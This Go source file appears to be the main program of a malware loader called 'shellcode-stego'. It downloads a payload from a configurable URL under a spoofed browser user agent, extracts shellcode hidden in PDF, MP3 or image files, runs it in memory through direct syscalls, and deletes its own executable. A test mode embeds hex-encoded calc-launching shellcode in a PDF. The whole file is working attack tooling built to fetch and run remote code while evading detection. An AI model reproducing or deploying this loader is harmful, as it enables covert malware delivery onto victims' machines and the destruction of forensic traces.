package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	winapi "github.com/carved4/go-direct-syscall"
	"shellcode-stego/pkg/embed"
	"shellcode-stego/pkg/execute"
	"shellcode-stego/pkg/extractor"
)

const (
	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
	defaultDownloadURL = ""
	// feel free to change this to whatever you want.. this is just a stand in so it isn't the go net/http user agent
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
)

func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"

	// Convert hex string to bytes
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}

type Config struct {
	URL            string
	ForceImage     bool
	ForceMP3       bool
	ForcePDF       bool
	ForceShellcode bool
	TestMode       bool
}

func parseFlags() (*Config, error) {
	config := &Config{}

	flag.BoolVar(&config.ForceImage, "image", false, "Force extraction from image file (PNG/JPEG)")
	flag.BoolVar(&config.ForceMP3, "mp3", false, "Force extraction from MP3 ID3 tags")
	flag.BoolVar(&config.ForcePDF, "pdf", false, "Force extraction from PDF metadata")
	flag.BoolVar(&config.ForceShellcode, "shellcode", false, "Treat payload as raw shellcode (skip extraction)")
	flag.BoolVar(&config.TestMode, "test", false, "Test mode: embed calc shellcode in PDF and extract")
	flag.Parse()

	// Skip URL validation in test mode
	if !config.TestMode {
		args := flag.Args()
		if len(args) > 0 {
			config.URL = args[0]
			if !isValidURL(config.URL) {
				return nil, errors.New("URL must start with http:// or https://")
			}
		} else {
			config.URL = defaultDownloadURL
		}

		if config.URL == "" {
			return nil, errors.New("no download URL provided and no default URL configured")
		}
	}

	return config, nil
}

func isValidURL(url string) bool {
	return strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")
}

func createHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 60 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 30 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func downloadPayload(url string) ([]byte, error) {
	client := createHTTPClient()

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP request failed with status %d", resp.StatusCode)
	}

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	return payload, nil
}

func shouldExtract(config *Config, url string) bool {
	if config.ForceShellcode {
		return false
	}

	if config.ForceImage || config.ForceMP3 || config.ForcePDF {
		return true
	}

	ext := strings.ToLower(filepath.Ext(url))
	switch ext {
	case ".pdf":
		return true
	case ".mp3":
		return true
	case ".png", ".jpg", ".jpeg":
		return true
	case ".bin", ".exe":
		return false
	default:
		return true
	}
}

func processPayload(payload []byte, config *Config) ([]byte, error) {

	if shouldExtract(config, config.URL) {
		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
		if err != nil {

			fmt.Fprintf(os.Stderr, "Extraction failed, treating as raw payload: %v\n", err)
			return payload, nil
		}
		return extractedPayload, nil
	}

	return payload, nil
}

func executePayload(payload []byte) error {
	if len(payload) == 0 {
		return errors.New("payload is empty")
	}

	// delete before exec because it stays in memory anyways
	winapi.SelfDel()

	execute.ExecuteShellcode(payload)

	return nil
}

func run() error {
	config, err := parseFlags()
	if err != nil {
		return err
	}

	var payload []byte

	if config.TestMode {
		// Test mode: embed shellcode in PDF and then extract
		fmt.Fprintf(os.Stderr, "Test mode: Creating PDF with embedded shellcode...\n")

		shellcode := getEmbeddedShellcode()
		fmt.Fprintf(os.Stderr, "Generated %d bytes of test shellcode\n", len(shellcode))

		// Create temporary file for shellcode
		tempShellcode, err := ioutil.TempFile("", "shellcode_*.bin")
		if err != nil {
			return fmt.Errorf("failed to create temp shellcode file: %w", err)
		}
		defer os.Remove(tempShellcode.Name())
		defer tempShellcode.Close()

		if _, err := tempShellcode.Write(shellcode); err != nil {
			return fmt.Errorf("failed to write shellcode to temp file: %w", err)
		}
		tempShellcode.Close()

		// Create temporary output file
		tempOutput, err := ioutil.TempFile("", "output_*.pdf")
		if err != nil {
			return fmt.Errorf("failed to create temp output file: %w", err)
		}
		defer os.Remove(tempOutput.Name())
		tempOutput.Close()

		// Use EmbedPE to embed shellcode in PDF from tests folder (relative to project root)
		err = embed.EmbedPE("../tests/TheGoProgrammingLanguageCh1.pdf", tempShellcode.Name(), tempOutput.Name())
		if err != nil {
			return fmt.Errorf("failed to embed shellcode in PDF: %w", err)
		}

		// Read the resulting PDF
		payload, err = ioutil.ReadFile(tempOutput.Name())
		if err != nil {
			return fmt.Errorf("failed to read embedded PDF: %w", err)
		}

		fmt.Fprintf(os.Stderr, "Created PDF with embedded payload (%d bytes)\n", len(payload))
		config.ForcePDF = true // Force PDF extraction
	} else {
		// Normal mode: download from URL
		payload, err = downloadPayload(config.URL)
		if err != nil {
			return err
		}
	}

	processedPayload, err := processPayload(payload, config)
	if err != nil {
		return err
	}

	return executePayload(processedPayload)
}

func main() {
	// Always attempt self-deletion regardless of execution outcome
	defer winapi.SelfDel()

	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %s\n", err.Error())
		flag.Usage()
		os.Exit(1)
	}
}
